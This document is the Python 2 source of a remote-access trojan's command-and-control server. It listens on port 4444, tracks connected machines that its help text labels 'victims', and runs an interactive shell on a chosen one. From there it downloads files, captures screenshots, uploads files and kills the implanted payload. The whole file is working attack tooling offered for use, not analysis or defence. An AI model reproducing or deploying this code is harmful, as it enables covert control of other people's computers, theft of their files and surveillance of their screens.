from socket import socket , AF_INET , SOCK_STREAM
from threading import Thread
import os

host = '127.0.0.1'
port = 4444


def buffer(c):
	rcvd_data = 0
	size = 8
	length = int(c.recv(size))
	c.send(' ')
	data = ''
	while rcvd_data<length:
		offset = c.recv(size)
		rcvd_data+=size
		data += offset

	c.send(' ')
	return data

def folder_creator(fdname):
	if os.path.exists(fdname):
		pass
	else:
	    os.mkdir(fdname)

	current_dir = os.getcwd()
	return '%s\\%s\\'%(current_dir,fdname)


def screen_name_generator():
	try:
		name = 'screen1.jpg'
		last_screen = os.listdir(screens_folder)[-1]
		last_screen = last_screen.split('.')[0]
		if last_screen.startswith('screen') and len(last_screen)==5:
			pass
		else:
			id = int(last_screen[6:])+1
			name = 'screen%i.jpg'%id
	except IndexError:
		pass

	return name

def handle_fname(name,seperator):
	name = name.split(seperator)[-1]
	name = downloads_folder+name
	return name

def recv_files(id,name,c):
	if id is 1:
		if '\\' in name:
			seperator = '\\'
			name = handle_fname(name,seperator)
		elif '/' in name:
			seperator = '/'
			name = handle_fname(name,seperator)
		else:
			name = downloads_folder+name
	elif id is 2:
		name = screens_folder+name
	
	op = open(name,'wb')
	content = buffer(c)
	op.write(content)
	op.close()


def accept():
	for conn in all_conns:
		conn.close()
	del all_conns[:]
	del all_addrs[:]
	while True:
		try:
			conn,addr = s.accept()
			all_conns.append(conn)
			all_addrs.append(addr)
		except:
			pass

def list_conns():
	results = []
	for i,conn in enumerate(all_conns):
		try:
			sender('1',conn)
		except:
			del all_conns[i]
			del all_addrs[i]
			continue

		results.append('%i  %s:%i'%(i,all_addrs[i][0],all_addrs[i][1]))

	print '\n'.join(results)
	print 'Total: %i'%len(all_conns)

def select(cmd):
	try:
		target = int(cmd.split(' ')[1])
		conn = all_conns[target]
		sender('2',conn)
		print 'you are now connected to %s:%i'%(all_addrs[target][0],all_addrs[target][1])
		return conn
	except:
		print 'invalid selection\ncheck alive connections using command \'list\''
		return None

def sender(data,c):
	c.send(str(len(data)))
	c.recv(1)
	c.send(data)
	c.recv(1)

def handler(c):
	while True:
		try:

			print buffer(c)
			
		except:
			pass

		cmd = str(raw_input('>> '))
		
		if cmd == 'break':
			c.close()
			break
		
		if cmd.startswith('--'):
			indic = cmd.split(' ')[0]
			id = cmds[indic]
			clean_cmd = cmd.replace(indic+' ','')
			if id is 1:
				sender(cmd,c)
				recv_files(id,clean_cmd,c)
			elif id is 2:
				sender(cmd,c)
				recv_files(id,screen_name_generator(),c)
			elif id is 3:
				exit()
			elif id is 4:
				clean_cmd = clean_cmd.replace('"','')
				print clean_cmd
				op = open(clean_cmd,'rb')
				content = op.read()
				op.close()
				sender(cmd,c)
				sender(content,c)
			elif id is 5:
				sender(cmd,c)
		elif cmd == 'help':
			print '''
help   \t help
break  \t get back to interactive shell
--d    \t download file
--ts   \t take screenshot
--up   \t upload file
--kill \t drop connection (kill payload)
--q    \t quit
			'''
			sender(' ',c)
		else:
			try:
				sender(cmd,c)
			except Exception as e:
				print 'line 146'+str(e)
				break


def main():
	while True:
		intershell = str(raw_input('< shell > '))
		if intershell == 'help':
			print '''
help   \t help
clear  \t clear the screen
list   \t show active connections (victims)
select \t select connection (victim) by its id
break  \t drop connection (payload won't be killed) 
			'''
		elif intershell == 'clear':
			os.system('cls')
			continue
		elif intershell == 'break':
			exit()
		elif intershell == 'list':
			list_conns()
		elif intershell.startswith('select'.lower()):
			conn = select(intershell)
			if conn:
				handler(conn)
		else:
			print 'Unknow command'


		

cmds = {'--d':1,'--ts':2,'--q':3,'--up':4,'--kill':5}
downloads_folder = folder_creator('payload downloads')
screens_folder = folder_creator('screenshots')
all_conns = []
all_addrs = []

s = socket(AF_INET,SOCK_STREAM)
s.bind((host,port))
s.listen(5)

t1 = Thread(target=accept)
t1.daemon = True
t1.start()

main()
